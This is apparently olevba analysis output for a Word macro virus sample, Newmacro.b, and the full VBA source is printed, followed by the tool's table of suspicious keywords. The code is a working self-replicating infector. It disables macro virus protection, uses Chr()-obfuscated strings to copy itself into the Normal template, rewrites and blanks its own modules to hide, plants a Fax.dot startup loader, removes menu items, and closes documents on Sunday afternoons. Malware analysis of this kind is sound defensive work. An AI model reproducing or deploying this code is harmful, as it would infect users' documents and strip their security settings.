olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Newmacro.b-ff08367dbaa26f4c90a1d34ae50ca6e0a3d71f6b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Newmacro.b-ff08367dbaa26f4c90a1d34ae50ca6e0a3d71f6b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacro.bas 
in file: Virus.MSWord.Newmacro.b-ff08367dbaa26f4c90a1d34ae50ca6e0a3d71f6b - OLE stream: 'Macros/VBA/NewMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.ShowVisualBasicEditor = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Call Routine
Call Setpath
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "Macro_Run" Then GoTo Label_Exit
    If NormalTemplate.VBProject.VBComponents(I).Name = "NewMacro" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "NewMacro" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("NewMacro").CodeModule.CountOfLines
NormalTemplate.Save
Doc.VBProject.VBComponents("NewMacro").Export Pad + ("\NewMacro.txt")
Call CreateMacro
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Label_Exit:
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
If NormInstall = True Then Call Create_Loader
Call Restorepath
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub CreateMacro()
Application.ScreenUpdating = False
Dim decrypt(23)
decrypt(1) = Chr(65) + Chr(116) + Chr(116) + Chr(114) + Chr(105) + Chr(98) + Chr(117) + Chr(116) + Chr(101) + Chr(32) + Chr(86) + Chr(66) + Chr(95) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(95) + Chr(82) + Chr(117) + Chr(110) + Chr(34)
decrypt(2) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
decrypt(3) = Chr(79) + Chr(110) + Chr(32) + Chr(69) + Chr(114) + Chr(114) + Chr(111) + Chr(114) + Chr(32) + Chr(82) + Chr(101) + Chr(115) + Chr(117) + Chr(109) + Chr(101) + Chr(32) + Chr(78) + Chr(101) + Chr(120) + Chr(116)
decrypt(4) = Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(46) + Chr(68) + Chr(105) + Chr(115) + Chr(112) + Chr(108) + Chr(97) + Chr(121) + Chr(65) + Chr(108) + Chr(101) + Chr(114) + Chr(116) + Chr(115) + Chr(32) + Chr(61) + Chr(32) + Chr(119) + Chr(100) + Chr(65) + Chr(108) + Chr(101) + Chr(114) + Chr(116) + Chr(115) + Chr(78) + Chr(111) + Chr(110) + Chr(101)
decrypt(5) = Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(61) + Chr(32) + Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115) + Chr(46) + Chr(68) + Chr(101) + Chr(102) + Chr(97) + Chr(117) + Chr(108) + Chr(116) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(80) + Chr(97) + Chr(116) + Chr(104) + Chr(40) + Chr(119) + Chr(100) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(80) + Chr(97) + Chr(116) + Chr(104) + Chr(41)
decrypt(6) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(73) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116)
decrypt(7) = Chr(73) + Chr(102) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(78) + Chr(101) + Chr(119) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
decrypt(8) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(73)
decrypt(9) = Chr(70) + Chr(111) + Chr(114) + Chr(32) + Chr(73) + Chr(32) + Chr(61) + Chr(32) + Chr(49) + Chr(32) + Chr(84) + Chr(111) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(67) + Chr(111) + Chr(117) + Chr(110) + Chr(116)
decrypt(10) = Chr(73) + Chr(102) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(78) + Chr(101) + Chr(119) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101)
decrypt(11) = Chr(78) + Chr(101) + Chr(120) + Chr(116) + Chr(32) + Chr(73)
decrypt(12) = Chr(73) + Chr(102) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(84) + Chr(114) + Chr(117) + Chr(101) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(71) + Chr(111) + Chr(84) + Chr(111) + Chr(32) + Chr(76) + Chr(97) + Chr(98) + Chr(101) + Chr(108) + Chr(95) + Chr(69) + Chr(120) + Chr(105) + Chr(116)
decrypt(13) = Chr(73) + Chr(102) + Chr(32) + Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(73) + Chr(110) + Chr(115) + Chr(116) + Chr(97) + Chr(108) + Chr(108) + Chr(32) + Chr(61) + Chr(32) + Chr(70) + Chr(97) + Chr(108) + Chr(115) + Chr(101) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110)
decrypt(14) = Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(40) + Chr(34) + Chr(47) + Chr(78) + Chr(101) + Chr(119) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(46) + Chr(116) + Chr(120) + Chr(116) + Chr(34) + Chr(41)
decrypt(15) = Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(83) + Chr(97) + Chr(118) + Chr(101)
decrypt(16) = Chr(69) + Chr(108) + Chr(115) + Chr(101)
decrypt(17) = Chr(68) + Chr(110) + Chr(97) + Chr(109) + Chr(101) + Chr(32) + Chr(61) + Chr(32) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(70) + Chr(117) + Chr(108) + Chr(108) + Chr(78) + Chr(97) + Chr(109) + Chr(101)
decrypt(18) = Chr(73) + Chr(102) + Chr(32) + Chr(76) + Chr(101) + Chr(102) + Chr(116) + Chr(36) + Chr(40) + Chr(68) + Chr(110) + Chr(97) + Chr(109) + Chr(101) + Chr(44) + Chr(32) + Chr(56) + Chr(41) + Chr(32) + Chr(61) + Chr(32) + Chr(34) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(34) + Chr(32) + Chr(84) + Chr(104) + Chr(101) + Chr(110) + Chr(32) + Chr(71) + Chr(111) + Chr(84) + Chr(111) + Chr(32) + Chr(76) + Chr(97) + Chr(98) + Chr(101) + Chr(108) + Chr(95) + Chr(69) + Chr(120) + Chr(105) + Chr(116)
decrypt(19) = Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(40) + Chr(34) + Chr(47) + Chr(78) + Chr(101) + Chr(119) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(46) + Chr(116) + Chr(120) + Chr(116) + Chr(34) + Chr(41)
decrypt(20) = Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(83) + Chr(97) + Chr(118) + Chr(101) + Chr(65) + Chr(115) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(58) + Chr(61) + Chr(65) + Chr(99) + Chr(116) + Chr(105) + Chr(118) + Chr(101) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(46) + Chr(70) + Chr(117) + Chr(108) + Chr(108) + Chr(78) + Chr(97) + Chr(109) + Chr(101) + Chr(44) + Chr(32) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(70) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(116) + Chr(58) + Chr(61) + Chr(119) + Chr(100) + Chr(70) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(116) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116)
decrypt(21) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(102)
decrypt(22) = Chr(76) + Chr(97) + Chr(98) + Chr(101) + Chr(108) + Chr(95) + Chr(69) + Chr(120) + Chr(105) + Chr(116) + Chr(58)
decrypt(23) = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98)
Pad = Options.DefaultFilePath(wdDocumentsPath)
FileNumber = FreeFile
Open Pad + "\Macro_Run.txt" For Output As #FileNumber
For X = 1 To 23
    Print #FileNumber, decrypt(X)
Next X
Close #FileNumber
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "NewMacro" Then NormInstall = True
Next I
If NormInstall = True Then
    Set Obj = NormalTemplate.VBProject
Else
    Set Obj = ActiveDocument.VBProject
End If
With Application
    Obj.VBComponents("NewMacro").CodeModule.ReplaceLine 85, Chr(78) + Chr(111) + Chr(114) + Chr(109) + Chr(97) + Chr(108) + Chr(84) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(116) + Chr(101) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(46) + Chr(73) + Chr(109) + Chr(112) + Chr(111) + Chr(114) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(34) + Chr(92) + Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111) + Chr(95) + Chr(82) + Chr(117) + Chr(110) + Chr(46) + Chr(116) + Chr(120) + Chr(116) + Chr(34)
     Call Do_The_Thing
    Obj.VBComponents("NewMacro").CodeModule.ReplaceLine 85, "'Temporary line do not remove!"
    NormalTemplate.Save
End With
Application.ScreenUpdating = True
End Sub
Sub Do_The_Thing()
Pad = Options.DefaultFilePath(wdDocumentsPath)
'Temporary line do not remove!
End Sub
Sub ToolsMacro()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 134, Chr(68) + Chr(111) + Chr(99) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(40) + Chr(34) + Chr(92) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(49) + Chr(46) + Chr(98) + Chr(97) + Chr(115) + Chr(34) + Chr(41)
ActiveDocument.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 134, Chr(68) + Chr(111) + Chr(99) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(40) + Chr(34) + Chr(92) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(49) + Chr(46) + Chr(98) + Chr(97) + Chr(115) + Chr(34) + Chr(41)
NormalTemplate.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 138, Chr(68) + Chr(111) + Chr(99) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(40) + Chr(34) + Chr(92) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(50) + Chr(46) + Chr(98) + Chr(97) + Chr(115) + Chr(34) + Chr(41)
ActiveDocument.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 138, Chr(68) + Chr(111) + Chr(99) + Chr(46) + Chr(86) + Chr(66) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(46) + Chr(86) + Chr(66) + Chr(67) + Chr(111) + Chr(109) + Chr(112) + Chr(111) + Chr(110) + Chr(101) + Chr(110) + Chr(116) + Chr(115) + Chr(40) + Chr(73) + Chr(41) + Chr(46) + Chr(67) + Chr(111) + Chr(100) + Chr(101) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(46) + Chr(65) + Chr(100) + Chr(100) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(70) + Chr(105) + Chr(108) + Chr(101) + Chr(32) + Chr(80) + Chr(97) + Chr(100) + Chr(32) + Chr(43) + Chr(32) + Chr(40) + Chr(34) + Chr(92) + Chr(77) + Chr(111) + Chr(100) + Chr(117) + Chr(108) + Chr(101) + Chr(50) + Chr(46) + Chr(98) + Chr(97) + Chr(115) + Chr(34) + Chr(41)
Call Hide
NormalTemplate.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 134, "'Temporary line. Do NOT remove!"
ActiveDocument.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 134, "'Temporary line. Do NOT remove!"
NormalTemplate.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 138, "'Temporary line. Do NOT remove!"
ActiveDocument.VBProject.VBComponents("NewMacro").CodeModule.ReplaceLine 138, "'Temporary line. Do NOT remove!"
NormalTemplate.Save
End Sub
Sub Hide()
On Error Resume Next
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
Pad = Options.DefaultFilePath(wdDocumentsPath)
Set Doc = NormalTemplate
Again:
For I = 1 To Doc.VBProject.VBComponents.Count
    If Doc <> NormalTemplate Then GoTo Over
    If Doc.VBProject.VBComponents(I).Name = "Macro_Run" Then
        Doc.VBProject.VBComponents(I).Export Pad + "\Module1.bas"
    End If
Over:
    If Doc.VBProject.VBComponents(I).Name = "NewMacro" Then
        Doc.VBProject.VBComponents(I).Export Pad + "\Module2.bas"
    End If
    a = Doc.VBProject.VBComponents(I).CodeModule.CountOfLines
    Doc.VBProject.VBComponents(I).CodeModule.DeleteLines 1, a
Next I
If Flag = 1 Or ActiveDocument = NormalTemplate Then GoTo Done
Flag = 1
Set Doc = ActiveDocument
GoTo Again
Done:
Flag = 0
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
Set Doc = NormalTemplate
Again1:
For I = 1 To Doc.VBProject.VBComponents.Count
    If Doc <> NormalTemplate Then GoTo Over2
    If Doc.VBProject.VBComponents(I).Name = "Macro_Run" Then
'Temporary line. Do NOT remove!
    End If
Over2:
    If Doc.VBProject.VBComponents(I).Name = "NewMacro" Then
'Temporary line. Do NOT remove!
    End If
Next I
If Flag = 1 Or ActiveDocument = NormalTemplate Then GoTo Done1
Flag = 1
Set Doc = ActiveDocument
GoTo Again1
Done1:
Flag = 0
Kill Pad + ("\Module1.bas")
Kill Pad + ("\Module2.bas")
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Done2
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Done2:
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Public Sub AutoExec()
On Error Resume Next
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "NewMacro" Then NormInstall = True
    If NormalTemplate.VBProject.VBComponents(I).Name = "Macro_Run" Then GoTo Out
Next I
If NormInstall = False Then
    Pad = Options.DefaultFilePath(wdDocumentsPath)
    NormalTemplate.VBProject.VBComponents.Import Pad + "\Macro_Run.txt"
End If
Out:
AddIns("Fax.dot").Delete
StartupPad = Options.DefaultFilePath(wdUserOptionsPath)
Options.DefaultFilePath(wdUserOptionsPath) = ""
Options.DefaultFilePath(wdStartupPath) = StartupPad
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
Assistant.Visible = True
Assistant.Help
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoExit()
On Error Resume Next
Pad = Options.DefaultFilePath(wdDocumentsPath)
Application.NormalTemplate.VBProject.VBComponents.Remove Application.NormalTemplate.VBProject.VBComponents("Macro_Run")
Call Setpath
NormalTemplate.Save
End Sub
Sub Routine()
On Error Resume Next
MyTime = Time
If WeekDay(Now) = 1 And Left$(MyTime, 1) = "5" And Right$(MyTime, 2) = "PM" Then
    With Assistant.NewBalloon
    .Icon = msoIconMsAlert
    .Text = "Doesn't work on Sunday Afternoon. Try again Monday."
    .Heading = "NewMacro message:" & Chr$(13) & "Document not available."
    .Animation = msoAnimationWorkingAtSomething
    Assistant.Visible = True
    .Show
End With
Assistant.Visible = False
ActiveDocument.Close
End If
End Sub
Sub Create_Loader()
On Error Resume Next
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\Fax.dot")
If MyFile = "" Then
Set aDoc = NormalTemplate.OpenAsDocument
With aDoc
    .SaveAs FileName:=Pad1 + "\Fax.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub Setpath()
TempFilePad = Options.DefaultFilePath(wdTempFilePath)
StartupPad = Options.DefaultFilePath(wdStartupPath)
Options.DefaultFilePath(wdUserOptionsPath) = StartupPad
Options.DefaultFilePath(wdStartupPath) = TempFilePad
End Sub
Sub Restorepath()
StartupPad = Options.DefaultFilePath(wdUserOptionsPath)
Options.DefaultFilePath(wdUserOptionsPath) = ""
Options.DefaultFilePath(wdStartupPath) = StartupPad
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

